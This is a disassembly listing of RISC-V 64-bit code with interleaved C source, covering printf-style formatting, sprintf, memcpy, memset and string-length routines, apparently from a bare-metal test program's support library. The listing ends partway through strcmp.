    80001f2e:	00000797          	auipc	a5,0x0
    80001f32:	7e278793          	addi	a5,a5,2018 # 80002710 <atol+0x12c>
    80001f36:	97ba                	add	a5,a5,a4
    80001f38:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80001f3a:	02d00793          	li	a5,45
    80001f3e:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001f42:	b77d                	j	80001ef0 <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    80001f44:	03000793          	li	a5,48
    80001f48:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80001f4c:	b755                	j	80001ef0 <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    80001f4e:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    80001f52:	fc842703          	lw	a4,-56(s0)
    80001f56:	87ba                	mv	a5,a4
    80001f58:	0027979b          	slliw	a5,a5,0x2
    80001f5c:	9fb9                	addw	a5,a5,a4
    80001f5e:	0017979b          	slliw	a5,a5,0x1
    80001f62:	2781                	sext.w	a5,a5
    80001f64:	9fa5                	addw	a5,a5,s1
    80001f66:	2781                	sext.w	a5,a5
    80001f68:	fd07879b          	addiw	a5,a5,-48
    80001f6c:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    80001f70:	f9843783          	ld	a5,-104(s0)
    80001f74:	0007c783          	lbu	a5,0(a5)
    80001f78:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    80001f7c:	8726                	mv	a4,s1
    80001f7e:	02f00793          	li	a5,47
    80001f82:	04e7d363          	ble	a4,a5,80001fc8 <vprintfmt+0x154>
    80001f86:	8726                	mv	a4,s1
    80001f88:	03900793          	li	a5,57
    80001f8c:	02e7ce63          	blt	a5,a4,80001fc8 <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    80001f90:	f9843783          	ld	a5,-104(s0)
    80001f94:	0785                	addi	a5,a5,1
    80001f96:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    80001f9a:	bf65                	j	80001f52 <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    80001f9c:	f9043783          	ld	a5,-112(s0)
    80001fa0:	00878713          	addi	a4,a5,8
    80001fa4:	f8e43823          	sd	a4,-112(s0)
    80001fa8:	439c                	lw	a5,0(a5)
    80001faa:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    80001fae:	a831                	j	80001fca <vprintfmt+0x156>

    case '.':
      if (width < 0)
    80001fb0:	fcc42783          	lw	a5,-52(s0)
    80001fb4:	2781                	sext.w	a5,a5
    80001fb6:	f207dde3          	bgez	a5,80001ef0 <vprintfmt+0x7c>
        width = 0;
    80001fba:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    80001fbe:	bf0d                	j	80001ef0 <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    80001fc0:	4785                	li	a5,1
    80001fc2:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    80001fc6:	b72d                	j	80001ef0 <vprintfmt+0x7c>
      goto process_precision;
    80001fc8:	0001                	nop

    process_precision:
      if (width < 0)
    80001fca:	fcc42783          	lw	a5,-52(s0)
    80001fce:	2781                	sext.w	a5,a5
    80001fd0:	f207d0e3          	bgez	a5,80001ef0 <vprintfmt+0x7c>
        width = precision, precision = -1;
    80001fd4:	fc842783          	lw	a5,-56(s0)
    80001fd8:	fcf42623          	sw	a5,-52(s0)
    80001fdc:	57fd                	li	a5,-1
    80001fde:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    80001fe2:	b739                	j	80001ef0 <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    80001fe4:	fd042783          	lw	a5,-48(s0)
    80001fe8:	2785                	addiw	a5,a5,1
    80001fea:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    80001fee:	b709                	j	80001ef0 <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    80001ff0:	f9043783          	ld	a5,-112(s0)
    80001ff4:	00878713          	addi	a4,a5,8
    80001ff8:	f8e43823          	sd	a4,-112(s0)
    80001ffc:	439c                	lw	a5,0(a5)
    80001ffe:	fa843703          	ld	a4,-88(s0)
    80002002:	fa043583          	ld	a1,-96(s0)
    80002006:	853e                	mv	a0,a5
    80002008:	9702                	jalr	a4
      break;
    8000200a:	aa65                	j	800021c2 <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    8000200c:	f9043783          	ld	a5,-112(s0)
    80002010:	00878713          	addi	a4,a5,8
    80002014:	f8e43823          	sd	a4,-112(s0)
    80002018:	0007b903          	ld	s2,0(a5)
    8000201c:	00091663          	bnez	s2,80002028 <vprintfmt+0x1b4>
        p = "(null)";
    80002020:	00000917          	auipc	s2,0x0
    80002024:	6e890913          	addi	s2,s2,1768 # 80002708 <atol+0x124>
      if (width > 0 && padc != '-')
    80002028:	fcc42783          	lw	a5,-52(s0)
    8000202c:	2781                	sext.w	a5,a5
    8000202e:	06f05a63          	blez	a5,800020a2 <vprintfmt+0x22e>
    80002032:	fc744783          	lbu	a5,-57(s0)
    80002036:	0ff7f713          	andi	a4,a5,255
    8000203a:	02d00793          	li	a5,45
    8000203e:	06f70263          	beq	a4,a5,800020a2 <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    80002042:	fc842783          	lw	a5,-56(s0)
    80002046:	85be                	mv	a1,a5
    80002048:	854a                	mv	a0,s2
    8000204a:	492000ef          	jal	ra,800024dc <strnlen>
    8000204e:	87aa                	mv	a5,a0
    80002050:	fcc42703          	lw	a4,-52(s0)
    80002054:	2781                	sext.w	a5,a5
    80002056:	40f707bb          	subw	a5,a4,a5
    8000205a:	2781                	sext.w	a5,a5
    8000205c:	fcf42623          	sw	a5,-52(s0)
    80002060:	a839                	j	8000207e <vprintfmt+0x20a>
          putch(padc, putdat);
    80002062:	fc744783          	lbu	a5,-57(s0)
    80002066:	2781                	sext.w	a5,a5
    80002068:	fa843703          	ld	a4,-88(s0)
    8000206c:	fa043583          	ld	a1,-96(s0)
    80002070:	853e                	mv	a0,a5
    80002072:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    80002074:	fcc42783          	lw	a5,-52(s0)
    80002078:	37fd                	addiw	a5,a5,-1
    8000207a:	fcf42623          	sw	a5,-52(s0)
    8000207e:	fcc42783          	lw	a5,-52(s0)
    80002082:	2781                	sext.w	a5,a5
    80002084:	fcf04fe3          	bgtz	a5,80002062 <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    80002088:	a829                	j	800020a2 <vprintfmt+0x22e>
        putch(ch, putdat);
    8000208a:	fa843783          	ld	a5,-88(s0)
    8000208e:	fa043583          	ld	a1,-96(s0)
    80002092:	8526                	mv	a0,s1
    80002094:	9782                	jalr	a5
        p++;
    80002096:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    80002098:	fcc42783          	lw	a5,-52(s0)
    8000209c:	37fd                	addiw	a5,a5,-1
    8000209e:	fcf42623          	sw	a5,-52(s0)
    800020a2:	00094783          	lbu	a5,0(s2)
    800020a6:	0007849b          	sext.w	s1,a5
    800020aa:	cc8d                	beqz	s1,800020e4 <vprintfmt+0x270>
    800020ac:	fc842783          	lw	a5,-56(s0)
    800020b0:	2781                	sext.w	a5,a5
    800020b2:	fc07cce3          	bltz	a5,8000208a <vprintfmt+0x216>
    800020b6:	fc842783          	lw	a5,-56(s0)
    800020ba:	37fd                	addiw	a5,a5,-1
    800020bc:	fcf42423          	sw	a5,-56(s0)
    800020c0:	fc842783          	lw	a5,-56(s0)
    800020c4:	2781                	sext.w	a5,a5
    800020c6:	fc07d2e3          	bgez	a5,8000208a <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    800020ca:	a829                	j	800020e4 <vprintfmt+0x270>
        putch(' ', putdat);
    800020cc:	fa843783          	ld	a5,-88(s0)
    800020d0:	fa043583          	ld	a1,-96(s0)
    800020d4:	02000513          	li	a0,32
    800020d8:	9782                	jalr	a5
      for (; width > 0; width--)
    800020da:	fcc42783          	lw	a5,-52(s0)
    800020de:	37fd                	addiw	a5,a5,-1
    800020e0:	fcf42623          	sw	a5,-52(s0)
    800020e4:	fcc42783          	lw	a5,-52(s0)
    800020e8:	2781                	sext.w	a5,a5
    800020ea:	fef041e3          	bgtz	a5,800020cc <vprintfmt+0x258>
      break;
    800020ee:	a8d1                	j	800021c2 <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    800020f0:	fd042703          	lw	a4,-48(s0)
    800020f4:	f9040793          	addi	a5,s0,-112
    800020f8:	85ba                	mv	a1,a4
    800020fa:	853e                	mv	a0,a5
    800020fc:	d11ff0ef          	jal	ra,80001e0c <getint>
    80002100:	87aa                	mv	a5,a0
    80002102:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    80002106:	fd843783          	ld	a5,-40(s0)
    8000210a:	0007df63          	bgez	a5,80002128 <vprintfmt+0x2b4>
        putch('-', putdat);
    8000210e:	fa843783          	ld	a5,-88(s0)
    80002112:	fa043583          	ld	a1,-96(s0)
    80002116:	02d00513          	li	a0,45
    8000211a:	9782                	jalr	a5
        num = -(long long) num;
    8000211c:	fd843783          	ld	a5,-40(s0)
    80002120:	40f007b3          	neg	a5,a5
    80002124:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    80002128:	47a9                	li	a5,10
    8000212a:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    8000212e:	a0b9                	j	8000217c <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    80002130:	47a9                	li	a5,10
    80002132:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002136:	a80d                	j	80002168 <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    80002138:	47a1                	li	a5,8
    8000213a:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    8000213e:	a02d                	j	80002168 <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    80002140:	4785                	li	a5,1
    80002142:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    80002146:	fa843783          	ld	a5,-88(s0)
    8000214a:	fa043583          	ld	a1,-96(s0)
    8000214e:	03000513          	li	a0,48
    80002152:	9782                	jalr	a5
      putch('x', putdat);
    80002154:	fa843783          	ld	a5,-88(s0)
    80002158:	fa043583          	ld	a1,-96(s0)
    8000215c:	07800513          	li	a0,120
    80002160:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    80002162:	47c1                	li	a5,16
    80002164:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    80002168:	fd042703          	lw	a4,-48(s0)
    8000216c:	f9040793          	addi	a5,s0,-112
    80002170:	85ba                	mv	a1,a4
    80002172:	853e                	mv	a0,a5
    80002174:	c2dff0ef          	jal	ra,80001da0 <getuint>
    80002178:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    8000217c:	fd442683          	lw	a3,-44(s0)
    80002180:	fc744783          	lbu	a5,-57(s0)
    80002184:	2781                	sext.w	a5,a5
    80002186:	fcc42703          	lw	a4,-52(s0)
    8000218a:	fd843603          	ld	a2,-40(s0)
    8000218e:	fa043583          	ld	a1,-96(s0)
    80002192:	fa843503          	ld	a0,-88(s0)
    80002196:	b0bff0ef          	jal	ra,80001ca0 <printnum>
      break;
    8000219a:	a025                	j	800021c2 <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    8000219c:	fa843783          	ld	a5,-88(s0)
    800021a0:	fa043583          	ld	a1,-96(s0)
    800021a4:	8526                	mv	a0,s1
    800021a6:	9782                	jalr	a5
      break;
    800021a8:	a829                	j	800021c2 <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    800021aa:	fa843783          	ld	a5,-88(s0)
    800021ae:	fa043583          	ld	a1,-96(s0)
    800021b2:	02500513          	li	a0,37
    800021b6:	9782                	jalr	a5
      fmt = last_fmt;
    800021b8:	fb843783          	ld	a5,-72(s0)
    800021bc:	f8f43c23          	sd	a5,-104(s0)
      break;
    800021c0:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    800021c2:	b1ed                	j	80001eac <vprintfmt+0x38>
        return;
    800021c4:	0001                	nop
    }
  }
}
    800021c6:	70a6                	ld	ra,104(sp)
    800021c8:	7406                	ld	s0,96(sp)
    800021ca:	64e6                	ld	s1,88(sp)
    800021cc:	6946                	ld	s2,80(sp)
    800021ce:	6165                	addi	sp,sp,112
    800021d0:	8082                	ret

00000000800021d2 <printf>:

int printf(const char* fmt, ...)
{
    800021d2:	7159                	addi	sp,sp,-112
    800021d4:	f406                	sd	ra,40(sp)
    800021d6:	f022                	sd	s0,32(sp)
    800021d8:	1800                	addi	s0,sp,48
    800021da:	fca43c23          	sd	a0,-40(s0)
    800021de:	e40c                	sd	a1,8(s0)
    800021e0:	e810                	sd	a2,16(s0)
    800021e2:	ec14                	sd	a3,24(s0)
    800021e4:	f018                	sd	a4,32(s0)
    800021e6:	f41c                	sd	a5,40(s0)
    800021e8:	03043823          	sd	a6,48(s0)
    800021ec:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    800021f0:	04040793          	addi	a5,s0,64
    800021f4:	fc878793          	addi	a5,a5,-56
    800021f8:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    800021fc:	fe843783          	ld	a5,-24(s0)
    80002200:	86be                	mv	a3,a5
    80002202:	fd843603          	ld	a2,-40(s0)
    80002206:	4581                	li	a1,0
    80002208:	00000517          	auipc	a0,0x0
    8000220c:	99850513          	addi	a0,a0,-1640 # 80001ba0 <putchar>
    80002210:	c65ff0ef          	jal	ra,80001e74 <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002214:	4781                	li	a5,0
}
    80002216:	853e                	mv	a0,a5
    80002218:	70a2                	ld	ra,40(sp)
    8000221a:	7402                	ld	s0,32(sp)
    8000221c:	6165                	addi	sp,sp,112
    8000221e:	8082                	ret

0000000080002220 <sprintf_putch.2963>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    80002220:	7139                	addi	sp,sp,-64
    80002222:	fc22                	sd	s0,56(sp)
    80002224:	0080                	addi	s0,sp,64
    80002226:	87aa                	mv	a5,a0
    80002228:	fcb43823          	sd	a1,-48(s0)
    8000222c:	fcf42e23          	sw	a5,-36(s0)
    80002230:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002234:	fd043783          	ld	a5,-48(s0)
    80002238:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    8000223c:	fe843783          	ld	a5,-24(s0)
    80002240:	639c                	ld	a5,0(a5)
    80002242:	fdc42703          	lw	a4,-36(s0)
    80002246:	0ff77713          	andi	a4,a4,255
    8000224a:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    8000224e:	fe843783          	ld	a5,-24(s0)
    80002252:	639c                	ld	a5,0(a5)
    80002254:	00178713          	addi	a4,a5,1
    80002258:	fe843783          	ld	a5,-24(s0)
    8000225c:	e398                	sd	a4,0(a5)
  }
    8000225e:	0001                	nop
    80002260:	7462                	ld	s0,56(sp)
    80002262:	6121                	addi	sp,sp,64
    80002264:	8082                	ret

0000000080002266 <sprintf>:
{
    80002266:	7111                	addi	sp,sp,-256
    80002268:	e586                	sd	ra,200(sp)
    8000226a:	e1a2                	sd	s0,192(sp)
    8000226c:	0980                	addi	s0,sp,208
    8000226e:	f2a43c23          	sd	a0,-200(s0)
    80002272:	f2b43823          	sd	a1,-208(s0)
    80002276:	e010                	sd	a2,0(s0)
    80002278:	e414                	sd	a3,8(s0)
    8000227a:	e818                	sd	a4,16(s0)
    8000227c:	ec1c                	sd	a5,24(s0)
    8000227e:	03043023          	sd	a6,32(s0)
    80002282:	03143423          	sd	a7,40(s0)
int	_EXFUN(feof, (FILE *));
int	_EXFUN(ferror, (FILE *));
void    _EXFUN(perror, (const char *));
#ifndef _REENT_ONLY
FILE *	_EXFUN(fopen, (const char *__restrict _name, const char *__restrict _type));
int	_EXFUN(sprintf, (char *__restrict, const char *__restrict, ...)
    80002286:	03040793          	addi	a5,s0,48
    8000228a:	fcf43c23          	sd	a5,-40(s0)
    8000228e:	f4840793          	addi	a5,s0,-184
    80002292:	f4840713          	addi	a4,s0,-184
    80002296:	39700693          	li	a3,919
    8000229a:	c394                	sw	a3,0(a5)
    8000229c:	0183b6b7          	lui	a3,0x183b
    800022a0:	3036869b          	addiw	a3,a3,771
    800022a4:	c3d4                	sw	a3,4(a5)
    800022a6:	0103b6b7          	lui	a3,0x103b
    800022aa:	3836869b          	addiw	a3,a3,899
    800022ae:	c794                	sw	a3,8(a5)
    800022b0:	000306b7          	lui	a3,0x30
    800022b4:	0676869b          	addiw	a3,a3,103
    800022b8:	c7d4                	sw	a3,12(a5)
    800022ba:	eb98                	sd	a4,16(a5)
    800022bc:	00000717          	auipc	a4,0x0
    800022c0:	f6470713          	addi	a4,a4,-156 # 80002220 <sprintf_putch.2963>
    800022c4:	ef98                	sd	a4,24(a5)
    800022c6:	0000100f          	fence.i
  char* str0 = str;
    800022ca:	f3843783          	ld	a5,-200(s0)
    800022ce:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    800022d2:	03040793          	addi	a5,s0,48
    800022d6:	fd078793          	addi	a5,a5,-48
    800022da:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    800022de:	fe043703          	ld	a4,-32(s0)
    800022e2:	f4840793          	addi	a5,s0,-184
    800022e6:	853e                	mv	a0,a5
    800022e8:	f3840793          	addi	a5,s0,-200
    800022ec:	86ba                	mv	a3,a4
    800022ee:	f3043603          	ld	a2,-208(s0)
    800022f2:	85be                	mv	a1,a5
    800022f4:	b81ff0ef          	jal	ra,80001e74 <vprintfmt>
  *str = 0;
    800022f8:	f3843783          	ld	a5,-200(s0)
    800022fc:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    80002300:	f3843783          	ld	a5,-200(s0)
    80002304:	873e                	mv	a4,a5
    80002306:	fe843783          	ld	a5,-24(s0)
    8000230a:	40f707b3          	sub	a5,a4,a5
    8000230e:	2781                	sext.w	a5,a5
}
    80002310:	853e                	mv	a0,a5
    80002312:	60ae                	ld	ra,200(sp)
    80002314:	640e                	ld	s0,192(sp)
    80002316:	6111                	addi	sp,sp,256
    80002318:	8082                	ret

000000008000231a <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    8000231a:	715d                	addi	sp,sp,-80
    8000231c:	e4a2                	sd	s0,72(sp)
    8000231e:	0880                	addi	s0,sp,80
    80002320:	fca43423          	sd	a0,-56(s0)
    80002324:	fcb43023          	sd	a1,-64(s0)
    80002328:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    8000232c:	fc843703          	ld	a4,-56(s0)
    80002330:	fc043783          	ld	a5,-64(s0)
    80002334:	8f5d                	or	a4,a4,a5
    80002336:	fb843783          	ld	a5,-72(s0)
    8000233a:	8fd9                	or	a5,a5,a4
    8000233c:	8b9d                	andi	a5,a5,7
    8000233e:	e3b1                	bnez	a5,80002382 <memcpy+0x68>
    const uintptr_t* s = src;
    80002340:	fc043783          	ld	a5,-64(s0)
    80002344:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    80002348:	fc843783          	ld	a5,-56(s0)
    8000234c:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    80002350:	a839                	j	8000236e <memcpy+0x54>
      *d++ = *s++;
    80002352:	fe843703          	ld	a4,-24(s0)
    80002356:	00870793          	addi	a5,a4,8
    8000235a:	fef43423          	sd	a5,-24(s0)
    8000235e:	fe043783          	ld	a5,-32(s0)
    80002362:	00878693          	addi	a3,a5,8
    80002366:	fed43023          	sd	a3,-32(s0)
    8000236a:	6318                	ld	a4,0(a4)
    8000236c:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000236e:	fc843703          	ld	a4,-56(s0)
    80002372:	fb843783          	ld	a5,-72(s0)
    80002376:	97ba                	add	a5,a5,a4
    80002378:	fe043703          	ld	a4,-32(s0)
    8000237c:	fcf76be3          	bltu	a4,a5,80002352 <memcpy+0x38>
    80002380:	a099                	j	800023c6 <memcpy+0xac>
  } else {
    const char* s = src;
    80002382:	fc043783          	ld	a5,-64(s0)
    80002386:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    8000238a:	fc843783          	ld	a5,-56(s0)
    8000238e:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    80002392:	a00d                	j	800023b4 <memcpy+0x9a>
      *d++ = *s++;
    80002394:	fd843703          	ld	a4,-40(s0)
    80002398:	00170793          	addi	a5,a4,1
    8000239c:	fcf43c23          	sd	a5,-40(s0)
    800023a0:	fd043783          	ld	a5,-48(s0)
    800023a4:	00178693          	addi	a3,a5,1
    800023a8:	fcd43823          	sd	a3,-48(s0)
    800023ac:	00074703          	lbu	a4,0(a4)
    800023b0:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800023b4:	fc843703          	ld	a4,-56(s0)
    800023b8:	fb843783          	ld	a5,-72(s0)
    800023bc:	97ba                	add	a5,a5,a4
    800023be:	fd043703          	ld	a4,-48(s0)
    800023c2:	fcf769e3          	bltu	a4,a5,80002394 <memcpy+0x7a>
  }
  return dest;
    800023c6:	fc843783          	ld	a5,-56(s0)
}
    800023ca:	853e                	mv	a0,a5
    800023cc:	6426                	ld	s0,72(sp)
    800023ce:	6161                	addi	sp,sp,80
    800023d0:	8082                	ret

00000000800023d2 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    800023d2:	715d                	addi	sp,sp,-80
    800023d4:	e4a2                	sd	s0,72(sp)
    800023d6:	0880                	addi	s0,sp,80
    800023d8:	fca43423          	sd	a0,-56(s0)
    800023dc:	87ae                	mv	a5,a1
    800023de:	fac43c23          	sd	a2,-72(s0)
    800023e2:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    800023e6:	fc843703          	ld	a4,-56(s0)
    800023ea:	fb843783          	ld	a5,-72(s0)
    800023ee:	8fd9                	or	a5,a5,a4
    800023f0:	8b9d                	andi	a5,a5,7
    800023f2:	e7bd                	bnez	a5,80002460 <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    800023f4:	fc442783          	lw	a5,-60(s0)
    800023f8:	0ff7f793          	andi	a5,a5,255
    800023fc:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    80002400:	fd843783          	ld	a5,-40(s0)
    80002404:	07a2                	slli	a5,a5,0x8
    80002406:	fd843703          	ld	a4,-40(s0)
    8000240a:	8fd9                	or	a5,a5,a4
    8000240c:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    80002410:	fd843783          	ld	a5,-40(s0)
    80002414:	07c2                	slli	a5,a5,0x10
    80002416:	fd843703          	ld	a4,-40(s0)
    8000241a:	8fd9                	or	a5,a5,a4
    8000241c:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    80002420:	fd843783          	ld	a5,-40(s0)
    80002424:	1782                	slli	a5,a5,0x20
    80002426:	fd843703          	ld	a4,-40(s0)
    8000242a:	8fd9                	or	a5,a5,a4
    8000242c:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    80002430:	fc843783          	ld	a5,-56(s0)
    80002434:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    80002438:	a811                	j	8000244c <memset+0x7a>
      *d++ = word;
    8000243a:	fe843783          	ld	a5,-24(s0)
    8000243e:	00878713          	addi	a4,a5,8
    80002442:	fee43423          	sd	a4,-24(s0)
    80002446:	fd843703          	ld	a4,-40(s0)
    8000244a:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000244c:	fc843703          	ld	a4,-56(s0)
    80002450:	fb843783          	ld	a5,-72(s0)
    80002454:	97ba                	add	a5,a5,a4
    80002456:	fe843703          	ld	a4,-24(s0)
    8000245a:	fef760e3          	bltu	a4,a5,8000243a <memset+0x68>
    8000245e:	a81d                	j	80002494 <memset+0xc2>
  } else {
    char *d = dest;
    80002460:	fc843783          	ld	a5,-56(s0)
    80002464:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    80002468:	a829                	j	80002482 <memset+0xb0>
      *d++ = byte;
    8000246a:	fe043783          	ld	a5,-32(s0)
    8000246e:	00178713          	addi	a4,a5,1
    80002472:	fee43023          	sd	a4,-32(s0)
    80002476:	fc442703          	lw	a4,-60(s0)
    8000247a:	0ff77713          	andi	a4,a4,255
    8000247e:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002482:	fc843703          	ld	a4,-56(s0)
    80002486:	fb843783          	ld	a5,-72(s0)
    8000248a:	97ba                	add	a5,a5,a4
    8000248c:	fe043703          	ld	a4,-32(s0)
    80002490:	fcf76de3          	bltu	a4,a5,8000246a <memset+0x98>
  }
  return dest;
    80002494:	fc843783          	ld	a5,-56(s0)
}
    80002498:	853e                	mv	a0,a5
    8000249a:	6426                	ld	s0,72(sp)
    8000249c:	6161                	addi	sp,sp,80
    8000249e:	8082                	ret

00000000800024a0 <strlen>:

size_t strlen(const char *s)
{
    800024a0:	7179                	addi	sp,sp,-48
    800024a2:	f422                	sd	s0,40(sp)
    800024a4:	1800                	addi	s0,sp,48
    800024a6:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    800024aa:	fd843783          	ld	a5,-40(s0)
    800024ae:	fef43423          	sd	a5,-24(s0)
  while (*p)
    800024b2:	a031                	j	800024be <strlen+0x1e>
    p++;
    800024b4:	fe843783          	ld	a5,-24(s0)
    800024b8:	0785                	addi	a5,a5,1
    800024ba:	fef43423          	sd	a5,-24(s0)
  while (*p)
    800024be:	fe843783          	ld	a5,-24(s0)
    800024c2:	0007c783          	lbu	a5,0(a5)
    800024c6:	f7fd                	bnez	a5,800024b4 <strlen+0x14>
  return p - s;
    800024c8:	fe843703          	ld	a4,-24(s0)
    800024cc:	fd843783          	ld	a5,-40(s0)
    800024d0:	40f707b3          	sub	a5,a4,a5
}
    800024d4:	853e                	mv	a0,a5
    800024d6:	7422                	ld	s0,40(sp)
    800024d8:	6145                	addi	sp,sp,48
    800024da:	8082                	ret

00000000800024dc <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    800024dc:	7179                	addi	sp,sp,-48
    800024de:	f422                	sd	s0,40(sp)
    800024e0:	1800                	addi	s0,sp,48
    800024e2:	fca43c23          	sd	a0,-40(s0)
    800024e6:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    800024ea:	fd843783          	ld	a5,-40(s0)
    800024ee:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800024f2:	a031                	j	800024fe <strnlen+0x22>
    p++;
    800024f4:	fe843783          	ld	a5,-24(s0)
    800024f8:	0785                	addi	a5,a5,1
    800024fa:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800024fe:	fd043783          	ld	a5,-48(s0)
    80002502:	fff78713          	addi	a4,a5,-1
    80002506:	fce43823          	sd	a4,-48(s0)
    8000250a:	c791                	beqz	a5,80002516 <strnlen+0x3a>
    8000250c:	fe843783          	ld	a5,-24(s0)
    80002510:	0007c783          	lbu	a5,0(a5)
    80002514:	f3e5                	bnez	a5,800024f4 <strnlen+0x18>
  return p - s;
    80002516:	fe843703          	ld	a4,-24(s0)
    8000251a:	fd843783          	ld	a5,-40(s0)
    8000251e:	40f707b3          	sub	a5,a4,a5
}
    80002522:	853e                	mv	a0,a5
    80002524:	7422                	ld	s0,40(sp)
    80002526:	6145                	addi	sp,sp,48
    80002528:	8082                	ret

000000008000252a <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    8000252a:	7179                	addi	sp,sp,-48
    8000252c:	f422                	sd	s0,40(sp)
    8000252e:	1800                	addi	s0,sp,48
    80002530:	fca43c23          	sd	a0,-40(s0)
    80002534:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    80002538:	fd843783          	ld	a5,-40(s0)
    8000253c:	00178713          	addi	a4,a5,1
    80002540:	fce43c23          	sd	a4,-40(s0)
    80002544:	0007c783          	lbu	a5,0(a5)
    80002548:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    8000254c:	fd043783          	ld	a5,-48(s0)
    80002550:	00178713          	addi	a4,a5,1
    80002554:	fce43823          	sd	a4,-48(s0)
    80002558:	0007c783          	lbu	a5,0(a5)
    8000255c:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    80002560:	fef44783          	lbu	a5,-17(s0)
    80002564:	0ff7f793          	andi	a5,a5,255
    80002568:	cb99                	beqz	a5,8000257e <strcmp+0x54>
    8000256a:	fef44703          	lbu	a4,-17(s0)
    8000256e:	fee44783          	lbu	a5,-18(s0)
    80002572:	0ff77713          	andi	a4,a4,255
